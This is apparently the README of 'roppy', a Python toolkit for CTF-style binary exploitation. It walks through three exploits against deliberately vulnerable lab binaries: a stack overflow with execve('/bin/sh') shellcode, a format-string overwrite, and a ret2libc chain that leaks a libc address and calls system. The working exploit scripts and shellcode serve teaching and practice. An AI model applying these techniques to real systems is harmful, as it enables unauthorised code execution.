# roppy


A Pwning toolkit which allows you to interact with local process and network and lighten up your work during pwn. I made this in order to get the better understanding of python so that I could learn pwning more and this is one of my best project so far.





### Perquisites

Roppy depends on multiple third party libraries which include:-

* `pyelftools`:           For ELF File Analysis.
* `keystone-engine`:      For assembling instructions useful for shellcode development.
* `capstone`:             For disassembling the assembly instructions.


### Documentation

Although I'm working on do a documentation readthedocs but working alone on this project is very tiresome so I have to work 2x times of usual work and on the side work I have to learn about Pwning more.

For the time being, the documentation can be found [here](https://github.com/D4mianWayne/roppy/wiki/), this is not going to be forever and I recommend you to go through the examples.

##### Why roppy?

This question will arise as you soon as you see the example section and may think that pwntools is better than this, which I agree. But `roppy` contains more what pwntools has to offer, with the ROP module being in active development which is based on the symblolic execution to make ROP chains and saving time, it is also going to be used an automation for the simple pwn challenges on which we don't want to waste time over and move on to harder challenges as quickly as possible.

### Installing roppy

To install roppy:-

* Clone the repository

`$ git clone https://github.com/D4mianWayne/roppy.git`

* Use `setup.py` to install
```
$ cd roppy
$ sudo python3 setup.py install
```

# Examples

Let's take couple of examples:-


### Simple Overflow

We have the following piece of code:-

```C
#include<stdio.h>

int main()
{
	char buf[30];
	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);
	printf("Address: %p\n", &buf);
	printf("Echo: ");
	scanf("%s", &buf);
	printf("You said: %s\n", buf);
	return 0;
}
```

Now, we compile this with the `gcc -zexecstack -fno-stack-protector vuln.c -o vuln` and run it:-

```r
d4mian@oracle:~/dev/roppy$ ./vuln
Address: 0x7fff171c08e0
Echo: HELLO
You said: HELLO
```

Since we used `scanf("%s", &buf)` it is vulnerable to buffer overflow and stack is executable and on top of that buffer address is being leaked, we can create a exploit:-

```py
from pwn import *

p = process("./vuln")

shellcode = b"\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"

addr = int(p.recvline().split()[1].strip(), 16) # This line is recieving the address
log.info("Leak: 0x%x" %(addr))
payload = shellcode + b"A"*(40 - len(shellcode)) + p64(addr)
pause()
p.sendline(payload)

p.interactive()
```

Running the exploit:-

```py
d4mian@oracle:~/dev/roppy$ python3 vuln_xpl.py 
[+] Starting program './vuln': PID 19902
[*] Leak: 0x7fff7cf0c030
[*] Switching to interactive mode
$ whoami
d4mian
$ 
[*] Interrupted
[*] Stopped program './vuln'
d4mian@oracle:~/dev/roppy$ 
```


### Format String Attack

We take the `fmt` binary from the examples folder, reverse engineering it and seeing the code, we see:-

```r
   0x080492c7 <+115>:	cmp    eax,0x1
   0x080492ca <+118>:	jne    0x80492de <main+138>
   0x080492cc <+120>:	sub    esp,0xc
   0x080492cf <+123>:	lea    eax,[ebx-0x1fef]
   0x080492d5 <+129>:	push   eax
   0x080492d6 <+130>:	call   0x80490c0 <system@plt>
   0x080492db <+135>:	add    esp,0x10
```

Here, the line 115 is comparing `eax` with the value 1, here `eax` contains the value of the variable named `cookie`, we develop the exploit:-

```py
from roppy import *

p = process("./fmt1")
elf = ELF("fmt1")

payload = fmtstr32(7, {elf.symbols['cookie']: 1})
p.sendlineafter(b":", payload)
p.interactive()
```

Now, when we run the exploit, we get a nice shell:-

```r
d4mian@oracle:/tmp/fmt$ python3 fmt1.py 
[+] Starting program './fmt1': PID 20079
[*] ELF: /home/d4mian/dev/roppy/fmt1
[*] Switching to interactive mode
AAAA,
$ ls
fmt1  fmt1.py  pwn2  pwn2.py  timu.py
$ 
[*] Interrupted
[*] Stopped program './fmt1'
```

There are other examples, included in the `/examples/fmt` folder.


### Ret2libc Attack 

For the last example, we take the `ret2libc` attack as an example, in `/examples/ret2libc` binary, we can run the binary-

```r
d4mian@oracle:/tmp/ret2libc$ ./chall
AAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

Since binary is 32 bit and have NX Enabled, we can create a `ret2libc` attack, we first leak the `puts` address and jump back to `main`:-

```py
from roppy import *


p = process("./chall")
elf = ELF("chall")
libc = elf.libc
context.log_level = 'info'

payload = b"A"*13
payload += p32(elf.plt['write'])
payload += p32(elf.symbols['main'])
payload += p32(1)
payload += p32(elf.got['read'])
payload += p32(0x8)

p.sendline(payload)

read_leaked = u32(p.recv()[:4].strip().ljust(4, b"\x00"))

log.info("read@libc: "+hex(read_leaked))

p.interactive()
```

Running the exploit:-

```r
d4mian@oracle:/tmp/ret2libc$ python3 chall.py 
[+] Starting program './chall': PID 20185
[*] ELF: /tmp/ret2libc/chall
[*] ELF: /lib/i386-linux-gnu/libc.so.6
[*] read@libc: 0xf7e28a40
[*] Switching to interactive mode
```

Now, we get the `LIBC` base address by subtracting the offsets:-

```py
libc.address = read_leaked - libc.symbols['read']
log.info("LIBC     : 0x%x" %(libc.address))```
```
We get:-

```r
d4mian@oracle:/tmp/ret2libc$ python3 chall.py 
[+] Starting program './chall': PID 20266
[*] ELF: /tmp/ret2libc/chall
[*] ELF: /lib/i386-linux-gnu/libc.so.6
[*] read@libc: 0xf7e91a40
[*] LIBC     : 0xf7d9c000
[*] Switching to interactive mode
@\x1a���\xad��$  
```

Now, we just give one more payload:-

```py

system = libc.symbols['system']
bin_sh = libc.search(b"/bin/sh\x00")
log.info("system   : 0x%x" %(system))
log.info("binsh    : 0x%x" %(bin_sh))
payload = b"A"*13
payload += p32(system)
payload += p32(0xdeadbeef)
payload += p32(bin_sh)

p.sendline(payload)
```


Running it:-

```r
d4mian@oracle:/tmp/ret2libc$ python3 chall.py 
[+] Starting program './chall': PID 20307
[*] ELF: /tmp/ret2libc/chall
[*] ELF: /lib/i386-linux-gnu/libc.so.6
[*] read@libc: 0xf7e3fa40
[*] LIBC     : 0xf7d4a000
[*] system   : 0xf7d8f830
[*] binsh    : 0xf7edc352
[*] Switching to interactive mode
$ whoami
d4mian
$ 
[*] Interrupted
[*] Stopped program './chall'
```

# Release

Although, it is ready for usage there's still lots of things missing which will soon be implemented, please have some patience.